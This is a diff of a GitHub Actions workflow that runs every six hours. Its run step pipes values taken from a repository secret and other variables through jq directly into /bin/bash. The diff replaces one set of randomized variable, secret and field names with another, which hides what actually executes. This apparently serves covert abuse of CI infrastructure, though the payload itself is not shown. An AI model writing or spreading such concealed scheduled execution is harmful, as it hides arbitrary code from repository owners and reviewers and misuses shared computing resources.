@@ -1,35 +1,34 @@
 name: jiankonshig
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 1/6 * * *'
+    - cron: '11 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiankonshig
         env:
-          daddi16747: ${{ secrets.daddi16747 }}
+          hwgvw53: ${{ secrets.hwgvw53 }}
         run: |
-          echo $daddi16747 | jq -r .y822 | /bin/bash
-          echo $vnmlc7 | jq -r .xehnx25 | /bin/bash
-          echo $seo0191 | jq -r .g8 | /bin/bash
-          echo $pxbpt1415 | jq -r .wgz2849 | /bin/bash
-          echo $tcukg7175 | jq -r .q8566 | /bin/bash
-          echo $vci67 | jq -r .tigu54 | /bin/bash
-          echo $g10 | jq -r .vwn4 | /bin/bash
-          echo $pbas5799 | jq -r .safxb1 | /bin/bash
-          echo $q53 | jq -r .p24310 | /bin/bash
-          echo $djtzp640 | jq -r .u9047 | /bin/bash
-          echo $h80348 | jq -r .gxlqi18256 | /bin/bash
-          echo $n2337 | jq -r .m84456 | /bin/bash
-          echo $jwu6198 | jq -r .wwvxn3173 | /bin/bash
-          echo $fkaqq0 | jq -r .ab434 | /bin/bash
-          echo $ylz32 | jq -r .rlitt313 | /bin/bash
-          echo $dovr4221 | jq -r .sipuo956 | /bin/bash
-          echo $aia16 | jq -r .ah20410 | /bin/bash
-          echo $hgn97157 | jq -r .is8 | /bin/bash
-          echo $jfh94399 | jq -r .jb6407 | /bin/bash
+          echo $hwgvw53 | jq -r .xsw100 | /bin/bash
+          echo $zuxu46 | jq -r .e966 | /bin/bash
+          echo $goh3 | jq -r .g65 | /bin/bash
+          echo $zkhp89913 | jq -r .eidb34 | /bin/bash
+          echo $m50206 | jq -r .mx52 | /bin/bash
+          echo $w773 | jq -r .mta1121 | /bin/bash
+          echo $b07 | jq -r .huh4 | /bin/bash
+          echo $xw98 | jq -r .cg52379 | /bin/bash
+          echo $ey1 | jq -r .sxxz9986 | /bin/bash
+          echo $iftd03 | jq -r .ds4 | /bin/bash
+          echo $oef64999 | jq -r .vanqx338 | /bin/bash
+          echo $rere12700 | jq -r .ny99978 | /bin/bash
+          echo $wopui78 | jq -r .a00970 | /bin/bash
+          echo $wxw54 | jq -r .s31 | /bin/bash
+          echo $vruh45140 | jq -r .aiypn7313 | /bin/bash
+          echo $fptd8 | jq -r .uxr37223 | /bin/bash
+          echo $xym258 | jq -r .ffzkm3508 | /bin/bash
 
